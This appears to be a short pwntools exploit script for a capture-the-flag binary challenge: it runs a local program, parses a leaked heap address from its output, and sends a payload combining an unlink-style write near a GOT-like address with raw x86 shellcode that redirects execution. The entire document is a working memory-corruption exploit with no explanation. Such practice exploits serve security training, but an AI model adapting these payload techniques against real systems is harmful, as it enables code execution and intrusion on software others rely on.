from pwn import *
programPath = "/problems/p03-2_3_e361d8aac55f9a630fdbd6369c555c97/example416"
sh = process([programPath, "cmd_line_arg"])
output = sh.recvline()
firstAddress = output[40:len(output)-2]
payload = p32(0x804d028 - 12) + p32(int(firstAddress, 16) + 8) + "\xB8\x06\x89\x04\x08\xFF\xE0"
sh.sendline(payload)
print(sh.recvall().decode())